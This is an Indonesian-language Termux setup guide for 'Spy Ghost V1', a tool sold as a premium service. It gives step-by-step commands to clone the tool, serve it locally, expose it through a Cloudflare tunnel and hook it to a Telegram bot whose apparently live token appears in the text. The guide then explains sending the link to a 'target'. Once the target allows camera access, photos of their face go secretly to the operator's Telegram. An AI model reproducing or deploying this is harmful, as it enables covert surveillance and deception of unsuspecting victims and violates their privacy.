👻 SPY GHOST V1: PANDUAN INSTALASI TERMUX
1. Update & Instal Bahan (Copy-Paste Semua)
Ketik ini di Termux lu, jika ada pilihan (y/n) ketik y lalu Enter:
pkg update && pkg upgrade -y && pkg install php git cloudflared -y

2. Download Script dari GitHub Lu
Perintah ini untuk mengambil folder spyghost yang sudah lu upload tadi:
git clone https://github.com/Kensora95/spyghost && cd spyghost
3. Nyalakan Mesin Bot (Tab 1)
Jalankan server lokal di dalam folder script:
php -S localhost:8080
PENTING: Jangan tutup tab ini! Biarkan tetap jalan.

4. Buat Link Online (Tab 2)
Geser layar Termux dari kiri ke kanan, klik "New Session".
Ketik perintah ini di tab baru:
cloudflared tunnel --url http://localhost:8080
{Cari tulisan yang ada https:// dan berakhiran .trycloudflare.com.}
Copy Link tersebut (Misal: https://kensora-spy.trycloudflare.com).

5. Aktivasi Bot ke Telegram (Terakhir!)
Buka browser Chrome di HP lu, lalu masukkan link ini. Ganti [LINK_LU] dengan hasil copy dari Langkah 4
[https://api.telegram.org/bot8775494315:AAGtkIAWCSBMbQpZcnm-uVVh-VYciV1Rc6o/setWebhook?url=PASTE DI SINI YA/hasil.php]
Tanda Berhasil: Jika di layar browser muncul tulisan {"ok":true,"result":true,"description":"Webhook was set"}, berarti bot sudah ONLINE.

🎯 CARA KERJA "SIMSALABIM"
Link untuk Target: Ambil link dari Langkah 4 dan tambahkan (/index.php) di ujungnya.

Contoh: https://kensora-spy.trycloudflare.com/index.php

Hasil: Begitu target klik "Izinkan", foto wajah mereka akan terkirim secara rahasia ke Telegram lu sebagai Owner

Catatan: Karena lu pakai Termux (bukan VPS), setiap kali lu mematikan aplikasi, lu harus ulangi Langkah 3, 4, dan 5 karena link-nya akan berubah.


PAHAM LU GA?
GA PAHAM YA UDAH 

💡 CARA AKTIVASI (Wajib Baca!):
Karena sekarang ada Sistem Premium, lu harus daftarin ID lu sendiri dan ID pembeli dulu lewat Bot Telegram:

Buka Bot Telegram lu.

Ketik: /add 2016592856 365 (Ini buat daftarin ID lu sendiri selama 1 tahun).

Ketik: /add 7429015558 30 (Ini buat daftarin pembeli lu selama 30 hari).

Baru setelah itu lu tes klik di HP. Kalau belum di-/add, foto nggak bakal masuk.
